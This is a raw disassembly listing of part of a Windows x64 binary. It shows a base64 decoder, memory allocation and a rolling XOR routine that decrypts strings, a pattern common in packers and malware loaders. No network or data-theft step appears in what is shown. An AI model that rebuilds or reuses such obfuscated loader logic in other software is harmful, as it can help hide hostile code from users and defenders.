   140002d58:	48 8d 0d 41 00 00 00 	lea    0x41(%rip),%rcx        # 0x140002da0
   140002d5f:	e8 0c e6 ff ff       	call   0x140001370
   140002d64:	c6 05 2b b1 28 00 01 	movb   $0x1,0x28b12b(%rip)        # 0x14028de96
   140002d6b:	e9 aa f9 ff ff       	jmp    0x14000271a
   140002d70:	c6 05 87 b2 28 00 01 	movb   $0x1,0x28b287(%rip)        # 0x14028dffe
   140002d77:	66 c7 05 7c b2 28 00 	movw   $0xc7,0x28b27c(%rip)        # 0x14028dffc
   140002d7e:	c7 00 
   140002d80:	48 8d 0d 59 00 00 00 	lea    0x59(%rip),%rcx        # 0x140002de0
   140002d87:	e8 e4 e5 ff ff       	call   0x140001370
   140002d8c:	c6 05 05 b1 28 00 01 	movb   $0x1,0x28b105(%rip)        # 0x14028de98
   140002d93:	e9 16 fc ff ff       	jmp    0x1400029ae
   140002d98:	cc                   	int3
   140002d99:	cc                   	int3
   140002d9a:	cc                   	int3
   140002d9b:	cc                   	int3
   140002d9c:	cc                   	int3
   140002d9d:	cc                   	int3
   140002d9e:	cc                   	int3
   140002d9f:	cc                   	int3
   140002da0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002da3:	0f 11 05 30 b2 28 00 	movups %xmm0,0x28b230(%rip)        # 0x14028dfda
   140002daa:	0f 29 05 1f b2 28 00 	movaps %xmm0,0x28b21f(%rip)        # 0x14028dfd0
   140002db1:	c3                   	ret
   140002db2:	cc                   	int3
   140002db3:	cc                   	int3
   140002db4:	cc                   	int3
   140002db5:	cc                   	int3
   140002db6:	cc                   	int3
   140002db7:	cc                   	int3
   140002db8:	cc                   	int3
   140002db9:	cc                   	int3
   140002dba:	cc                   	int3
   140002dbb:	cc                   	int3
   140002dbc:	cc                   	int3
   140002dbd:	cc                   	int3
   140002dbe:	cc                   	int3
   140002dbf:	cc                   	int3
   140002dc0:	66 c7 05 2f b2 28 00 	movw   $0x0,0x28b22f(%rip)        # 0x14028dff8
   140002dc7:	00 00 
   140002dc9:	48 c7 05 1c b2 28 00 	movq   $0x0,0x28b21c(%rip)        # 0x14028dff0
   140002dd0:	00 00 00 00 
   140002dd4:	c3                   	ret
   140002dd5:	cc                   	int3
   140002dd6:	cc                   	int3
   140002dd7:	cc                   	int3
   140002dd8:	cc                   	int3
   140002dd9:	cc                   	int3
   140002dda:	cc                   	int3
   140002ddb:	cc                   	int3
   140002ddc:	cc                   	int3
   140002ddd:	cc                   	int3
   140002dde:	cc                   	int3
   140002ddf:	cc                   	int3
   140002de0:	66 c7 05 13 b2 28 00 	movw   $0x0,0x28b213(%rip)        # 0x14028dffc
   140002de7:	00 00 
   140002de9:	c3                   	ret
   140002dea:	cc                   	int3
   140002deb:	cc                   	int3
   140002dec:	cc                   	int3
   140002ded:	cc                   	int3
   140002dee:	cc                   	int3
   140002def:	cc                   	int3
   140002df0:	41 56                	push   %r14
   140002df2:	56                   	push   %rsi
   140002df3:	57                   	push   %rdi
   140002df4:	55                   	push   %rbp
   140002df5:	53                   	push   %rbx
   140002df6:	b8 60 00 01 00       	mov    $0x10060,%eax
   140002dfb:	e8 60 f8 ff ff       	call   0x140002660
   140002e00:	48 29 c4             	sub    %rax,%rsp
   140002e03:	4d 89 ce             	mov    %r9,%r14
   140002e06:	4c 89 c7             	mov    %r8,%rdi
   140002e09:	48 89 d6             	mov    %rdx,%rsi
   140002e0c:	89 cb                	mov    %ecx,%ebx
   140002e0e:	31 ed                	xor    %ebp,%ebp
   140002e10:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002e15:	41 b8 fe ff 00 00    	mov    $0xfffe,%r8d
   140002e1b:	31 d2                	xor    %edx,%edx
   140002e1d:	e8 ae 6f 00 00       	call   0x140009dd0
   140002e22:	48 8d 84 24 b0 00 01 	lea    0x100b0(%rsp),%rax
   140002e29:	00 
   140002e2a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002e2f:	41 0f b7 0e          	movzwl (%r14),%ecx
   140002e33:	66 85 c9             	test   %cx,%cx
   140002e36:	0f 84 bf 00 00 00    	je     0x140002efb
   140002e3c:	31 ed                	xor    %ebp,%ebp
   140002e3e:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140002e43:	eb 2e                	jmp    0x140002e73
   140002e45:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002e4c:	00 00 00 00 
   140002e50:	ff c5                	inc    %ebp
   140002e52:	66 89 4c 54 60       	mov    %cx,0x60(%rsp,%rdx,2)
   140002e57:	31 d2                	xor    %edx,%edx
   140002e59:	66 41 83 3e 00       	cmpw   $0x0,(%r14)
   140002e5e:	0f 95 c2             	setne  %dl
   140002e61:	41 0f b7 0c 56       	movzwl (%r14,%rdx,2),%ecx
   140002e66:	4d 8d 34 56          	lea    (%r14,%rdx,2),%r14
   140002e6a:	66 85 c9             	test   %cx,%cx
   140002e6d:	0f 84 88 00 00 00    	je     0x140002efb
   140002e73:	81 fd fd 7f 00 00    	cmp    $0x7ffd,%ebp
   140002e79:	0f 87 7c 00 00 00    	ja     0x140002efb
   140002e7f:	48 63 d5             	movslq %ebp,%rdx
   140002e82:	66 83 f9 25          	cmp    $0x25,%cx
   140002e86:	75 c8                	jne    0x140002e50
   140002e88:	49 8d 4e 02          	lea    0x2(%r14),%rcx
   140002e8c:	66 41 83 7e 02 53    	cmpw   $0x53,0x2(%r14)
   140002e92:	75 51                	jne    0x140002ee5
   140002e94:	4c 8d 40 08          	lea    0x8(%rax),%r8
   140002e98:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   140002e9d:	48 8b 00             	mov    (%rax),%rax
   140002ea0:	44 0f b7 10          	movzwl (%rax),%r10d
   140002ea4:	66 45 85 d2          	test   %r10w,%r10w
   140002ea8:	74 38                	je     0x140002ee2
   140002eaa:	48 81 fa ff 7f 00 00 	cmp    $0x7fff,%rdx
   140002eb1:	41 b9 fe 7f 00 00    	mov    $0x7ffe,%r9d
   140002eb7:	4c 0f 43 ca          	cmovae %rdx,%r9
   140002ebb:	48 83 c0 02          	add    $0x2,%rax
   140002ebf:	90                   	nop
   140002ec0:	48 81 fa fd 7f 00 00 	cmp    $0x7ffd,%rdx
   140002ec7:	77 24                	ja     0x140002eed
   140002ec9:	ff c5                	inc    %ebp
   140002ecb:	66 44 89 54 54 60    	mov    %r10w,0x60(%rsp,%rdx,2)
   140002ed1:	48 ff c2             	inc    %rdx
   140002ed4:	44 0f b7 10          	movzwl (%rax),%r10d
   140002ed8:	48 83 c0 02          	add    $0x2,%rax
   140002edc:	66 45 85 d2          	test   %r10w,%r10w
   140002ee0:	75 de                	jne    0x140002ec0
   140002ee2:	4c 89 c0             	mov    %r8,%rax
   140002ee5:	49 89 ce             	mov    %rcx,%r14
   140002ee8:	e9 6a ff ff ff       	jmp    0x140002e57
   140002eed:	4c 89 c0             	mov    %r8,%rax
   140002ef0:	44 89 cd             	mov    %r9d,%ebp
   140002ef3:	49 89 ce             	mov    %rcx,%r14
   140002ef6:	e9 5c ff ff ff       	jmp    0x140002e57
   140002efb:	48 63 c5             	movslq %ebp,%rax
   140002efe:	66 c7 44 44 60 00 00 	movw   $0x0,0x60(%rsp,%rax,2)
   140002f05:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140002f0c:	00 
   140002f0d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002f14:	00 00 
   140002f16:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140002f1b:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140002f20:	48 89 fa             	mov    %rdi,%rdx
   140002f23:	49 89 f1             	mov    %rsi,%r9
   140002f26:	e8 65 f7 ff ff       	call   0x140002690
   140002f2b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140002f30:	e8 29 e5 ff ff       	call   0x14000145e
   140002f35:	84 db                	test   %bl,%bl
   140002f37:	74 1a                	je     0x140002f53
   140002f39:	48 c7 44 24 40 00 5d 	movq   $0xffffffffee1e5d00,0x40(%rsp)
   140002f40:	1e ee 
   140002f42:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f47:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002f4c:	31 d2                	xor    %edx,%edx
   140002f4e:	e8 bf e5 ff ff       	call   0x140001512
   140002f53:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f58:	e8 01 e5 ff ff       	call   0x14000145e
   140002f5d:	90                   	nop
   140002f5e:	48 81 c4 60 00 01 00 	add    $0x10060,%rsp
   140002f65:	5b                   	pop    %rbx
   140002f66:	5d                   	pop    %rbp
   140002f67:	5f                   	pop    %rdi
   140002f68:	5e                   	pop    %rsi
   140002f69:	41 5e                	pop    %r14
   140002f6b:	c3                   	ret
   140002f6c:	cc                   	int3
   140002f6d:	cc                   	int3
   140002f6e:	cc                   	int3
   140002f6f:	cc                   	int3
   140002f70:	41 56                	push   %r14
   140002f72:	56                   	push   %rsi
   140002f73:	57                   	push   %rdi
   140002f74:	55                   	push   %rbp
   140002f75:	53                   	push   %rbx
   140002f76:	48 83 ec 40          	sub    $0x40,%rsp
   140002f7a:	4c 89 c6             	mov    %r8,%rsi
   140002f7d:	48 89 d7             	mov    %rdx,%rdi
   140002f80:	48 89 cb             	mov    %rcx,%rbx
   140002f83:	e8 58 02 00 00       	call   0x1400031e0
   140002f88:	48 89 f8             	mov    %rdi,%rax
   140002f8b:	48 c1 e8 02          	shr    $0x2,%rax
   140002f8f:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
   140002f93:	48 89 06             	mov    %rax,(%rsi)
   140002f96:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002f9b:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140002fa2:	00 00 
   140002fa4:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002fab:	00 
   140002fac:	c7 44 24 20 00 10 00 	movl   $0x1000,0x20(%rsp)
   140002fb3:	00 
   140002fb4:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002fb9:	45 31 f6             	xor    %r14d,%r14d
   140002fbc:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140002fc1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002fc8:	45 31 c0             	xor    %r8d,%r8d
   140002fcb:	e8 d9 e4 ff ff       	call   0x1400014a9
   140002fd0:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140002fd5:	41 b9 3e 00 00 00    	mov    $0x3e,%r9d
   140002fdb:	31 c9                	xor    %ecx,%ecx
   140002fdd:	eb 11                	jmp    0x140002ff0
   140002fdf:	90                   	nop
   140002fe0:	49 83 c6 04          	add    $0x4,%r14
   140002fe4:	48 89 d1             	mov    %rdx,%rcx
   140002fe7:	49 39 fe             	cmp    %rdi,%r14
   140002fea:	0f 83 d1 01 00 00    	jae    0x1400031c1
   140002ff0:	42 0f b6 04 33       	movzbl (%rbx,%r14,1),%eax
   140002ff5:	8d 50 a5             	lea    -0x5b(%rax),%edx
   140002ff8:	80 fa e6             	cmp    $0xe6,%dl
   140002ffb:	73 33                	jae    0x140003030
   140002ffd:	8d 50 85             	lea    -0x7b(%rax),%edx
   140003000:	80 fa e6             	cmp    $0xe6,%dl
   140003003:	73 3b                	jae    0x140003040
   140003005:	8d 50 c6             	lea    -0x3a(%rax),%edx
   140003008:	80 fa f6             	cmp    $0xf6,%dl
   14000300b:	73 38                	jae    0x140003045
   14000300d:	ba 3f 00 00 00       	mov    $0x3f,%edx
   140003012:	83 f8 2f             	cmp    $0x2f,%eax
   140003015:	74 02                	je     0x140003019
   140003017:	31 d2                	xor    %edx,%edx
   140003019:	83 f8 2b             	cmp    $0x2b,%eax
   14000301c:	41 0f 44 d1          	cmove  %r9d,%edx
   140003020:	eb 30                	jmp    0x140003052
   140003022:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003029:	1f 84 00 00 00 00 00 
   140003030:	83 c0 bf             	add    $0xffffffbf,%eax
   140003033:	eb 1b                	jmp    0x140003050
   140003035:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000303c:	00 00 00 00 
   140003040:	83 c0 b9             	add    $0xffffffb9,%eax
   140003043:	eb 0b                	jmp    0x140003050
   140003045:	83 c0 04             	add    $0x4,%eax
   140003048:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000304f:	00 
   140003050:	89 c2                	mov    %eax,%edx
   140003052:	42 0f b6 44 33 01    	movzbl 0x1(%rbx,%r14,1),%eax
   140003058:	44 8d 40 a5          	lea    -0x5b(%rax),%r8d
   14000305c:	41 80 f8 e6          	cmp    $0xe6,%r8b
   140003060:	73 2e                	jae    0x140003090
   140003062:	44 8d 40 85          	lea    -0x7b(%rax),%r8d
   140003066:	41 80 f8 e6          	cmp    $0xe6,%r8b
   14000306a:	73 34                	jae    0x1400030a0
   14000306c:	44 8d 40 c6          	lea    -0x3a(%rax),%r8d
   140003070:	41 80 f8 f6          	cmp    $0xf6,%r8b
   140003074:	73 2f                	jae    0x1400030a5
   140003076:	41 b8 3f 00 00 00    	mov    $0x3f,%r8d
   14000307c:	83 f8 2f             	cmp    $0x2f,%eax
   14000307f:	74 03                	je     0x140003084
   140003081:	45 31 c0             	xor    %r8d,%r8d
   140003084:	83 f8 2b             	cmp    $0x2b,%eax
   140003087:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000308b:	eb 26                	jmp    0x1400030b3
   14000308d:	0f 1f 00             	nopl   (%rax)
   140003090:	83 c0 bf             	add    $0xffffffbf,%eax
   140003093:	eb 1b                	jmp    0x1400030b0
   140003095:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000309c:	00 00 00 00 
   1400030a0:	83 c0 b9             	add    $0xffffffb9,%eax
   1400030a3:	eb 0b                	jmp    0x1400030b0
   1400030a5:	83 c0 04             	add    $0x4,%eax
   1400030a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400030af:	00 
   1400030b0:	41 89 c0             	mov    %eax,%r8d
   1400030b3:	46 0f b6 54 33 02    	movzbl 0x2(%rbx,%r14,1),%r10d
   1400030b9:	41 8d 42 a5          	lea    -0x5b(%r10),%eax
   1400030bd:	3c e6                	cmp    $0xe6,%al
   1400030bf:	73 2f                	jae    0x1400030f0
   1400030c1:	41 8d 42 85          	lea    -0x7b(%r10),%eax
   1400030c5:	3c e6                	cmp    $0xe6,%al
   1400030c7:	73 37                	jae    0x140003100
   1400030c9:	41 8d 42 c6          	lea    -0x3a(%r10),%eax
   1400030cd:	3c f6                	cmp    $0xf6,%al
   1400030cf:	73 35                	jae    0x140003106
   1400030d1:	b8 3f 00 00 00       	mov    $0x3f,%eax
   1400030d6:	41 83 fa 2f          	cmp    $0x2f,%r10d
   1400030da:	74 02                	je     0x1400030de
   1400030dc:	31 c0                	xor    %eax,%eax
   1400030de:	41 83 fa 2b          	cmp    $0x2b,%r10d
   1400030e2:	41 0f 44 c1          	cmove  %r9d,%eax
   1400030e6:	eb 2b                	jmp    0x140003113
   1400030e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400030ef:	00 
   1400030f0:	41 83 c2 bf          	add    $0xffffffbf,%r10d
   1400030f4:	eb 1a                	jmp    0x140003110
   1400030f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400030fd:	00 00 00 
   140003100:	41 83 c2 b9          	add    $0xffffffb9,%r10d
   140003104:	eb 0a                	jmp    0x140003110
   140003106:	41 83 c2 04          	add    $0x4,%r10d
   14000310a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003110:	44 89 d0             	mov    %r10d,%eax
   140003113:	46 0f b6 54 33 03    	movzbl 0x3(%rbx,%r14,1),%r10d
   140003119:	45 8d 5a a5          	lea    -0x5b(%r10),%r11d
   14000311d:	41 80 fb e6          	cmp    $0xe6,%r11b
   140003121:	73 2d                	jae    0x140003150
   140003123:	45 8d 5a 85          	lea    -0x7b(%r10),%r11d
   140003127:	41 80 fb e6          	cmp    $0xe6,%r11b
   14000312b:	73 33                	jae    0x140003160
   14000312d:	45 8d 5a c6          	lea    -0x3a(%r10),%r11d
   140003131:	41 80 fb f6          	cmp    $0xf6,%r11b
   140003135:	73 2f                	jae    0x140003166
   140003137:	41 bb 3f 00 00 00    	mov    $0x3f,%r11d
   14000313d:	41 83 fa 2f          	cmp    $0x2f,%r10d
   140003141:	74 03                	je     0x140003146
   140003143:	45 31 db             	xor    %r11d,%r11d
   140003146:	41 83 fa 2b          	cmp    $0x2b,%r10d
   14000314a:	45 0f 44 d9          	cmove  %r9d,%r11d
   14000314e:	eb 23                	jmp    0x140003173
   140003150:	41 83 c2 bf          	add    $0xffffffbf,%r10d
   140003154:	eb 1a                	jmp    0x140003170
   140003156:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000315d:	00 00 00 
   140003160:	41 83 c2 b9          	add    $0xffffffb9,%r10d
   140003164:	eb 0a                	jmp    0x140003170
   140003166:	41 83 c2 04          	add    $0x4,%r10d
   14000316a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003170:	45 89 d3             	mov    %r10d,%r11d
   140003173:	c1 e2 12             	shl    $0x12,%edx
   140003176:	41 c1 e0 0c          	shl    $0xc,%r8d
   14000317a:	41 09 d0             	or     %edx,%r8d
   14000317d:	c1 e0 06             	shl    $0x6,%eax
   140003180:	44 09 d8             	or     %r11d,%eax
   140003183:	44 09 c0             	or     %r8d,%eax
   140003186:	41 89 c0             	mov    %eax,%r8d
   140003189:	41 c1 e8 10          	shr    $0x10,%r8d
   14000318d:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   140003191:	44 88 44 0d 00       	mov    %r8b,0x0(%rbp,%rcx,1)
   140003196:	4c 8b 06             	mov    (%rsi),%r8
   140003199:	4c 39 c2             	cmp    %r8,%rdx
   14000319c:	73 0e                	jae    0x1400031ac
   14000319e:	88 64 0d 01          	mov    %ah,0x1(%rbp,%rcx,1)
   1400031a2:	48 83 c1 02          	add    $0x2,%rcx
   1400031a6:	4c 8b 06             	mov    (%rsi),%r8
   1400031a9:	48 89 ca             	mov    %rcx,%rdx
   1400031ac:	4c 39 c2             	cmp    %r8,%rdx
   1400031af:	0f 83 2b fe ff ff    	jae    0x140002fe0
   1400031b5:	88 44 15 00          	mov    %al,0x0(%rbp,%rdx,1)
   1400031b9:	48 ff c2             	inc    %rdx
   1400031bc:	e9 1f fe ff ff       	jmp    0x140002fe0
   1400031c1:	48 8b 16             	mov    (%rsi),%rdx
   1400031c4:	48 89 e9             	mov    %rbp,%rcx
   1400031c7:	e8 14 00 00 00       	call   0x1400031e0
   1400031cc:	48 89 e8             	mov    %rbp,%rax
   1400031cf:	48 83 c4 40          	add    $0x40,%rsp
   1400031d3:	5b                   	pop    %rbx
   1400031d4:	5d                   	pop    %rbp
   1400031d5:	5f                   	pop    %rdi
   1400031d6:	5e                   	pop    %rsi
   1400031d7:	41 5e                	pop    %r14
   1400031d9:	c3                   	ret
   1400031da:	cc                   	int3
   1400031db:	cc                   	int3
   1400031dc:	cc                   	int3
   1400031dd:	cc                   	int3
   1400031de:	cc                   	int3
   1400031df:	cc                   	int3
   1400031e0:	56                   	push   %rsi
   1400031e1:	57                   	push   %rdi
   1400031e2:	53                   	push   %rbx
   1400031e3:	48 83 ec 20          	sub    $0x20,%rsp
   1400031e7:	48 85 d2             	test   %rdx,%rdx
   1400031ea:	74 67                	je     0x140003253
   1400031ec:	48 89 d6             	mov    %rdx,%rsi
   1400031ef:	48 89 cf             	mov    %rcx,%rdi
   1400031f2:	0f b6 19             	movzbl (%rcx),%ebx
   1400031f5:	80 3d cc ac 28 00 00 	cmpb   $0x0,0x28accc(%rip)        # 0x14028dec8
   1400031fc:	0f 84 dc 00 00 00    	je     0x1400032de
   140003202:	80 3d 18 bf 28 00 00 	cmpb   $0x0,0x28bf18(%rip)        # 0x14028f121
   140003209:	74 3a                	je     0x140003245
   14000320b:	66 0f 6f 05 bd 73 00 	movdqa 0x73bd(%rip),%xmm0        # 0x14000a5d0
   140003212:	00 
   140003213:	66 0f 6f 0d e5 be 28 	movdqa 0x28bee5(%rip),%xmm1        # 0x14028f100
   14000321a:	00 
   14000321b:	66 0f fc c8          	paddb  %xmm0,%xmm1
   14000321f:	66 0f 7f 0d d9 be 28 	movdqa %xmm1,0x28bed9(%rip)        # 0x14028f100
   140003226:	00 
   140003227:	66 0f fc 05 e1 be 28 	paddb  0x28bee1(%rip),%xmm0        # 0x14028f110
   14000322e:	00 
   14000322f:	66 0f 7f 05 d9 be 28 	movdqa %xmm0,0x28bed9(%rip)        # 0x14028f110
   140003236:	00 
   140003237:	80 05 e2 be 28 00 e7 	addb   $0xe7,0x28bee2(%rip)        # 0x14028f120
   14000323e:	c6 05 dc be 28 00 00 	movb   $0x0,0x28bedc(%rip)        # 0x14028f121
   140003245:	32 1d b5 be 28 00    	xor    0x28beb5(%rip),%bl        # 0x14028f100
   14000324b:	88 1f                	mov    %bl,(%rdi)
   14000324d:	48 83 fe 01          	cmp    $0x1,%rsi
   140003251:	75 08                	jne    0x14000325b
   140003253:	48 83 c4 20          	add    $0x20,%rsp
   140003257:	5b                   	pop    %rbx
   140003258:	5f                   	pop    %rdi
   140003259:	5e                   	pop    %rsi
   14000325a:	c3                   	ret
   14000325b:	44 0f b6 05 be be 28 	movzbl 0x28bebe(%rip),%r8d        # 0x14028f121
   140003262:	00 
   140003263:	66 0f 6f 05 95 be 28 	movdqa 0x28be95(%rip),%xmm0        # 0x14028f100
   14000326a:	00 
   14000326b:	66 0f 6f 0d 9d be 28 	movdqa 0x28be9d(%rip),%xmm1        # 0x14028f110
   140003272:	00 
   140003273:	b8 01 00 00 00       	mov    $0x1,%eax
   140003278:	0f b6 0d a1 be 28 00 	movzbl 0x28bea1(%rip),%ecx        # 0x14028f120
   14000327f:	48 8d 15 7a be 28 00 	lea    0x28be7a(%rip),%rdx        # 0x14028f100
   140003286:	66 0f 6f 15 42 73 00 	movdqa 0x7342(%rip),%xmm2        # 0x14000a5d0
   14000328d:	00 
   14000328e:	eb 17                	jmp    0x1400032a7
   140003290:	41 89 c2             	mov    %eax,%r10d
   140003293:	41 83 e2 1f          	and    $0x1f,%r10d
   140003297:	45 32 0c 12          	xor    (%r10,%rdx,1),%r9b
   14000329b:	44 88 0c 07          	mov    %r9b,(%rdi,%rax,1)
   14000329f:	48 ff c0             	inc    %rax
   1400032a2:	48 39 c6             	cmp    %rax,%rsi
   1400032a5:	74 ac                	je     0x140003253
   1400032a7:	44 0f b6 0c 07       	movzbl (%rdi,%rax,1),%r9d
   1400032ac:	45 84 c0             	test   %r8b,%r8b
   1400032af:	74 df                	je     0x140003290
   1400032b1:	66 0f fc c2          	paddb  %xmm2,%xmm0
   1400032b5:	66 0f 7f 05 43 be 28 	movdqa %xmm0,0x28be43(%rip)        # 0x14028f100
   1400032bc:	00 
   1400032bd:	66 0f fc ca          	paddb  %xmm2,%xmm1
   1400032c1:	66 0f 7f 0d 47 be 28 	movdqa %xmm1,0x28be47(%rip)        # 0x14028f110
   1400032c8:	00 
   1400032c9:	80 c1 e7             	add    $0xe7,%cl
   1400032cc:	88 0d 4e be 28 00    	mov    %cl,0x28be4e(%rip)        # 0x14028f120
   1400032d2:	c6 05 48 be 28 00 00 	movb   $0x0,0x28be48(%rip)        # 0x14028f121
   1400032d9:	45 31 c0             	xor    %r8d,%r8d
   1400032dc:	eb b2                	jmp    0x140003290
   1400032de:	0f 28 05 cb 72 00 00 	movaps 0x72cb(%rip),%xmm0        # 0x14000a5b0
   1400032e5:	0f 29 05 14 be 28 00 	movaps %xmm0,0x28be14(%rip)        # 0x14028f100
   1400032ec:	66 0f 6f 05 cc 72 00 	movdqa 0x72cc(%rip),%xmm0        # 0x14000a5c0
   1400032f3:	00 
   1400032f4:	66 0f 7f 05 14 be 28 	movdqa %xmm0,0x28be14(%rip)        # 0x14028f110
   1400032fb:	00 
   1400032fc:	66 c7 05 1b be 28 00 	movw   $0x119,0x28be1b(%rip)        # 0x14028f120
   140003303:	19 01 
   140003305:	48 8d 0d 24 00 00 00 	lea    0x24(%rip),%rcx        # 0x140003330
   14000330c:	e8 5f e0 ff ff       	call   0x140001370
   140003311:	c6 05 b0 ab 28 00 01 	movb   $0x1,0x28abb0(%rip)        # 0x14028dec8
   140003318:	80 3d 02 be 28 00 00 	cmpb   $0x0,0x28be02(%rip)        # 0x14028f121
   14000331f:	0f 85 e6 fe ff ff    	jne    0x14000320b
   140003325:	e9 1b ff ff ff       	jmp    0x140003245
   14000332a:	cc                   	int3
   14000332b:	cc                   	int3
   14000332c:	cc                   	int3
   14000332d:	cc                   	int3
   14000332e:	cc                   	int3
   14000332f:	cc                   	int3
   140003330:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003333:	0f 29 05 d6 bd 28 00 	movaps %xmm0,0x28bdd6(%rip)        # 0x14028f110
   14000333a:	0f 29 05 bf bd 28 00 	movaps %xmm0,0x28bdbf(%rip)        # 0x14028f100
   140003341:	c6 05 d8 bd 28 00 00 	movb   $0x0,0x28bdd8(%rip)        # 0x14028f120
   140003348:	c3                   	ret
   140003349:	cc                   	int3
   14000334a:	cc                   	int3
   14000334b:	cc                   	int3
   14000334c:	cc                   	int3
   14000334d:	cc                   	int3
   14000334e:	cc                   	int3
   14000334f:	cc                   	int3
   140003350:	41 57                	push   %r15
   140003352:	41 56                	push   %r14
   140003354:	41 55                	push   %r13
   140003356:	41 54                	push   %r12
   140003358:	56                   	push   %rsi
   140003359:	57                   	push   %rdi
   14000335a:	55                   	push   %rbp
   14000335b:	53                   	push   %rbx
   14000335c:	48 81 ec 28 05 00 00 	sub    $0x528,%rsp
   140003363:	66 44 0f 7f 84 24 10 	movdqa %xmm8,0x510(%rsp)
   14000336a:	05 00 00 
   14000336d:	66 0f 7f bc 24 00 05 	movdqa %xmm7,0x500(%rsp)
   140003374:	00 00 
   140003376:	0f 29 b4 24 f0 04 00 	movaps %xmm6,0x4f0(%rsp)
   14000337d:	00 
   14000337e:	44 89 44 24 74       	mov    %r8d,0x74(%rsp)
   140003383:	48 89 94 24 c8 00 00 	mov    %rdx,0xc8(%rsp)
   14000338a:	00 
   14000338b:	48 89 cb             	mov    %rcx,%rbx
   14000338e:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   140003395:	00 00 
   140003397:	0f 57 f6             	xorps  %xmm6,%xmm6
   14000339a:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   1400033a1:	00 
   1400033a2:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400033a9:	00 
   1400033aa:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400033b0:	31 d2                	xor    %edx,%edx
   1400033b2:	e8 19 6a 00 00       	call   0x140009dd0
   1400033b7:	0f b7 03             	movzwl (%rbx),%eax
   1400033ba:	66 85 c0             	test   %ax,%ax
   1400033bd:	0f 84 fe 01 00 00    	je     0x1400035c1
   1400033c3:	4c 8d b4 24 e0 02 00 	lea    0x2e0(%rsp),%r14
   1400033ca:	00 
   1400033cb:	4c 8d a4 24 d0 00 00 	lea    0xd0(%rsp),%r12
   1400033d2:	00 
   1400033d3:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   1400033d8:	4c 8d 6c 24 78       	lea    0x78(%rsp),%r13
   1400033dd:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400033e4:	00 
   1400033e5:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
   1400033ec:	00 
   1400033ed:	66 0f 6f 3d eb 71 00 	movdqa 0x71eb(%rip),%xmm7        # 0x14000a5e0
   1400033f4:	00 
   1400033f5:	66 44 0f 6f 05 f2 71 	movdqa 0x71f2(%rip),%xmm8        # 0x14000a5f0
   1400033fc:	00 00 
   1400033fe:	45 31 ff             	xor    %r15d,%r15d
   140003401:	eb 20                	jmp    0x140003423
   140003403:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000340a:	84 00 00 00 00 00 
   140003410:	42 0f b7 44 3b 02    	movzwl 0x2(%rbx,%r15,1),%eax
   140003416:	49 83 c7 02          	add    $0x2,%r15
   14000341a:	66 85 c0             	test   %ax,%ax
   14000341d:	0f 84 9e 01 00 00    	je     0x1400035c1
   140003423:	66 42 89 84 3c d0 00 	mov    %ax,0xd0(%rsp,%r15,1)
   14000342a:	00 00 
   14000342c:	66 83 f8 2f          	cmp    $0x2f,%ax
   140003430:	74 08                	je     0x14000343a
   140003432:	0f b7 c0             	movzwl %ax,%eax
   140003435:	83 f8 5c             	cmp    $0x5c,%eax
   140003438:	75 d6                	jne    0x140003410
   14000343a:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140003440:	4c 89 f1             	mov    %r14,%rcx
   140003443:	31 d2                	xor    %edx,%edx
   140003445:	e8 86 69 00 00       	call   0x140009dd0
   14000344a:	80 3d 44 aa 28 00 00 	cmpb   $0x0,0x28aa44(%rip)        # 0x14028de95
   140003451:	0f 84 24 01 00 00    	je     0x14000357b
   140003457:	80 3d 64 ab 28 00 00 	cmpb   $0x0,0x28ab64(%rip)        # 0x14028dfc2
   14000345e:	74 33                	je     0x140003493
   140003460:	f3 0f 7e 05 50 ab 28 	movq   0x28ab50(%rip),%xmm0        # 0x14028dfb8
   140003467:	00 
